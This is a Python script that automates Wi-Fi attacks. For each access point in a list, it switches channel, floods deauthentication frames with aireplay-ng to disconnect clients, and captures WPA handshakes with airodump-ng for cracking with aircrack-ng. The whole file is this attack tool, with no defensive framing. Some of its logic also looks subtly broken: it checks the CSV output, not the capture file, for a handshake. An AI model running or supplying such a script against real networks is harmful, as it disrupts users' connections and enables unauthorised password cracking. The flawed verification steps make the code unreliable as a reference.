import subprocess
import os

# Adapter name modify as needed
WIRELESS_ADAPTER = os.getenv('WIRELESS_ADAPTER', 'wlan1')

def verify_handshake(handshake_file):
    """
    Verifies if the handshake file contains at least one EAPOL packet using aircrack-ng.
    Returns True if a handshake is detected, False otherwise.
    """
    try:
        result = subprocess.run(['aircrack-ng', handshake_file],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                text=True)
        if "1 handshake completed" in result.stdout:
            return True
        else:
            return False
    except Exception as e:
        print(f"[ERROR] Handshake verification failed: {e}")
        return False

# Function to deauthenticate and capture handshake
def deauthorization(bssid_list):
    if not WIRELESS_ADAPTER:
        print("[ERROR] Wireless adapter name not found.")
        return

    try:
        # Loop through each BSSID for deauthentication and handshake capture
        for bssid, channel in bssid_list:
            print(f"[INFO] Processing BSSID: {bssid} (Channel {channel})")
            
            # Set adapter to the correct channel
            try:
                subprocess.run(['iwconfig', WIRELESS_ADAPTER, 'channel', channel],
                               check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                print(f"[ERROR] Failed to switch to channel {channel} for BSSID {bssid}. Skipping...")
                continue

            # Deauthenticate the target MAC address
            try:
                subprocess.run(['aireplay-ng', '-0', '10', '-a', bssid, WIRELESS_ADAPTER],
                               check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[INFO] Deauthentication attempt sent to BSSID {bssid}")
            except subprocess.CalledProcessError:
                print(f"[ERROR] Failed to deauthenticate BSSID {bssid}. Skipping...")
                continue

            # Capture handshake with a unique filename and timeout
            handshake_filename = f"handshake_{bssid.replace(':', '')}"
            try:
                result = subprocess.run(['airodump-ng', '--bssid', bssid, '-c', channel, '-w', handshake_filename, WIRELESS_ADAPTER],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=15)
                if result.returncode == 0:
                    print(f"[INFO] Attempting to capture handshake for BSSID {bssid}...")
                else:
                    print(f"[ERROR] Failed to capture handshake from BSSID {bssid}.")
            except subprocess.CalledProcessError:
                print(f"[ERROR] Error capturing handshake for BSSID {bssid}.")
            except Exception as e:
                print(f"[ERROR] Unexpected error while capturing handshake for BSSID {bssid}: {e}")

            # Verify if handshake was successfully captured
            handshake_file = f"{handshake_filename}-01.csv"
            if os.path.exists(handshake_file):
                if verify_handshake(handshake_file):
                    print(f"[SUCCESS] Handshake successfully captured for BSSID {bssid}")
                else:
                    print(f"[WARN] Handshake for BSSID {bssid} not verified.")
            else:
                print(f"[WARN] Handshake file for BSSID {bssid} not found.")

    except Exception as e:
        print(f"[ERROR] Unexpected error in deauthorization function: {e}")

